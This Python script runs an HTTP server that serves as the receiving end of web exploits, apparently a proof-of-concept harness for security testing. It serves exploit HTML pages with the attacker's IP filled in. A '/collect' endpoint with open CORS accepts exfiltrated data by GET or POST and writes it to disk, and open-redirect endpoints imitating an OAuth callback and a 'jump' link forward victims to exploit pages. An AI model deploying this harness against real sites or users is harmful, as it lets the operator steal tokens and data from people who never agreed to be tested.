#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import http.server, json, urllib.parse, os, socket, time

PORT = 8000
EXP_DIR = os.path.join(os.path.dirname(__file__), "exp")
OUT_DIR = os.path.join(os.path.dirname(__file__), "received")
os.makedirs(OUT_DIR, exist_ok=True)

def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

LOCAL_IP = get_ip()
SAMPLE = os.path.basename(os.path.dirname(__file__))

class H(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        p = urllib.parse.urlparse(self.path)
        if p.path == "/collect":
            q = urllib.parse.parse_qs(p.query); d = q.get("d",[""])[0]
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            if d:
                ts = str(int(time.time()*1000))
                with open(os.path.join(OUT_DIR, f"collected_{ts}.txt"),"w",encoding="utf-8") as f:
                    f.write(urllib.parse.unquote(d))
                print(f"[+] {d[:100]}")
            self.wfile.write(b"ok"); return
        if p.path.startswith("/exp/"):
            fn = os.path.basename(p.path) or "index.html"
            if not fn.endswith(".html"): fn += ".html"
            fp = os.path.join(EXP_DIR, fn)
            if os.path.exists(fp):
                self.send_response(200); self.send_header("Content-Type","text/html; charset=utf-8"); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
                with open(fp,"r",encoding="utf-8") as f:
                    self.wfile.write(f.read().replace("{{LOCAL_IP}}", LOCAL_IP).encode("utf-8"))
            else:
                self.send_response(404); self.end_headers(); self.wfile.write(b"exp not found")
            return
        # OAuth redirect endpoint (official server simulation)
        if p.path.startswith("/oauth/callback"):
            q = urllib.parse.parse_qs(p.query)
            redirect_url = q.get("redirect_uri", ["/exp/2.2.2.html"])[0]
            print(f"[*] 302 redirect: {p.path} -> {redirect_url}")
            self.send_response(302)
            self.send_header("Location", redirect_url)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            return
        # Help center jump redirect
        if p.path.startswith("/jump"):
            q = urllib.parse.parse_qs(p.query)
            target = q.get("target", ["/exp/2.2.2.html"])[0]
            print(f"[*] 302 jump: {p.path} -> {target}")
            self.send_response(302)
            self.send_header("Location", target)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            return
        self.send_response(200); self.send_header("Content-Type","text/html"); self.end_headers()
        self.wfile.write(f"<h2>{SAMPLE}</h2><p>IP:{LOCAL_IP}</p><a href='/exp/1'>exp</a>".encode())
    def do_POST(self):
        cl = int(self.headers.get("Content-Length",0)); body = self.rfile.read(cl) if cl>0 else b""
        if self.path=="/collect":
            self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.end_headers()
            with open(os.path.join(OUT_DIR, f"collected_{int(time.time()*1000)}.txt"),"wb") as f: f.write(body)
            print(f"[+] POST:{body[:100]}"); self.wfile.write(b"ok"); return
        self.send_error(405)
    def do_OPTIONS(self):
        self.send_response(200); self.send_header("Access-Control-Allow-Origin","*"); self.send_header("Access-Control-Allow-Methods","GET,POST,OPTIONS"); self.send_header("Access-Control-Allow-Headers","*"); self.end_headers()
    def log_message(self, fmt, *args): print(f"[{args[0]}]")

if __name__ == "__main__":
    print(f"[*] {SAMPLE} on :{PORT}")
    print(f"[*] IP: {LOCAL_IP}")
    s = http.server.HTTPServer(("0.0.0.0", PORT), H)
    try: s.serve_forever()
    except KeyboardInterrupt: print("\n[*] Done"); s.shutdown()
